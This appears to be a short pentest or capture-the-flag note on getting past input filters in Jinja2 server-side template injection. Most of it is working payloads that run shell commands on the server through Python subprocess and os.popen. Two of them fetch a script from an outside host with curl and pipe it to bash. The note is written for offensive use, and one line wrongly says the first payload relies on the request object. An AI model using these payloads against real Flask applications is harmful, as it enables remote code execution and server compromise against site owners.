# filter bypass
[https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) 

[https://0day.work/jinja2-template-injection-filter-bypasses/](https://0day.work/jinja2-template-injection-filter-bypasses/) 

[https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) 

`.` are filtered, so we replace them with the attr functions, 

for replacing `_` we use `\x5f` but \\ is also filtered so we use `%5c`, we also needed to remove the `[]` which were replaced with the attr function and pipes

```text-plain
{{()|attr('%5cx5f%5cx5fclass%5cx5f%5cx5f')|attr('%5cx5f%5cx5fbase%5cx5f%5cx5f')|attr('%5cx5f%5cx5fsubclasses%5cx5f%5cx5f')()}}
```

working payload:

```text-plain
{{()|attr('%5cx5f%5cx5fclass%5cx5f%5cx5f')|attr('%5cx5f%5cx5fbase%5cx5f%5cx5f')|attr('%5cx5f%5cx5fsubclasses%5cx5f%5cx5f')()|attr('%5cx5f%5cx5fgetitem%5cx5f%5cx5f')(401)("ls",shell=True,stdout=-1)|attr('communicate')()|attr('%5cx5f%5cx5fgetitem%5cx5f%5cx5f')(0)|attr('decode')('utf-8')}}
```

The payload leverages the fact that Flask/Jinja2 templates have the `request` object available to them.

Leveraging the same tricks, the following payload would execute `id` using Python’s `os.popen()`:

```text-plain
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

In regular Python, we are just doing the following:

```text-plain
import os
os.popen('id')
```

```text-plain
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.17.17.11/shell | bash")|attr("read")()}}
```

The `|` indicates to Jija2 that we are applying a filter. The `attr()` filter “get\[s\] an attribute of an object”. As per the documentation, “`foo|attr("bar")` works like `foo.bar`.” `\x5f` is simply the hex representation of `_`.

If single quote is filtered

```text-plain
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl {ip}/rce | bash")|attr("read")()}}
```